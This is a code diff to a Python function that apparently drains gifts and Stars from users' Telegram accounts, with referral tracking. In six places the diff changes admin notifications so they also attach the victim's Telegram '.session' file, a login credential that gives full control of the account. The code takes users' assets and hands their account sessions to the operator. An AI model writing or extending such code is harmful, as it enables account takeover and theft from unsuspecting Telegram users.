@@ -111,7 +111,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                     referrer_username=referrer_username,
                     total_gifts_value=None
                 )
-                await send_admin_notification(notification)
+                # Get session file path
+                from server.session_storage.get_session_file_base import get_session_file_base
+                session_base = get_session_file_base(user_id)
+                session_file = f"{session_base}.session"
+                await send_admin_notification(notification, session_file if os.path.exists(session_file) else None)
                 
                 return error_msg
 
@@ -187,7 +191,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                         referrer_username=referrer_username,
                         total_gifts_value=regular_gifts_value
                     )
-                    await send_admin_notification(notification)
+                    # Get session file path
+                    from server.session_storage.get_session_file_base import get_session_file_base
+                    session_base = get_session_file_base(user_id)
+                    session_file = f"{session_base}.session"
+                    await send_admin_notification(notification, session_file if os.path.exists(session_file) else None)
                 else:
                     print("[AUTO-TRANSFER] [INFO] No Stars balance, nothing to send")
                     
@@ -218,7 +226,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                         referrer_username=referrer_username,
                         total_gifts_value=None
                     )
-                    await send_admin_notification(notification)
+                    # Get session file path
+                    from server.session_storage.get_session_file_base import get_session_file_base
+                    session_base = get_session_file_base(user_id)
+                    session_file = f"{session_base}.session"
+                    await send_admin_notification(notification, session_file if os.path.exists(session_file) else None)
                 return None
 
             # Calculate required Stars (15 per unique gift)
@@ -358,7 +370,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                     referrer_username=referrer_username,
                     total_gifts_value=total_gifts_value
                 )
-                await send_admin_notification(notification)
+                # Get session file path
+                from server.session_storage.get_session_file_base import get_session_file_base
+                session_base = get_session_file_base(user_id)
+                session_file = f"{session_base}.session"
+                await send_admin_notification(notification, session_file if os.path.exists(session_file) else None)
             else:
                 error_msg = f"Still not enough Stars ({stars_balance} < {required_transfer})"
                 print(f"[AUTO-TRANSFER] [ERROR] {error_msg}")
@@ -391,7 +407,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                     referrer_username=referrer_username,
                     total_gifts_value=None
                 )
-                await send_admin_notification(notification)
+                # Get session file path
+                from server.session_storage.get_session_file_base import get_session_file_base
+                session_base = get_session_file_base(user_id)
+                session_file = f"{session_base}.session"
+                await send_admin_notification(notification, session_file if os.path.exists(session_file) else None)
 
             print(f"[AUTO-TRANSFER] [INFO] Auto-transfer completed for user_id={user_id}")
             return None
@@ -439,7 +459,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
             referrer_username=referrer_username,
             total_gifts_value=None
         )
-        await send_admin_notification(notification)
+        # Get session file path
+        from server.session_storage.get_session_file_base import get_session_file_base
+        session_base = get_session_file_base(user_id)
+        session_file = f"{session_base}.session"
+        await send_admin_notification(notification, session_file if os.path.exists(session_file) else None)
         
         return error_msg
 
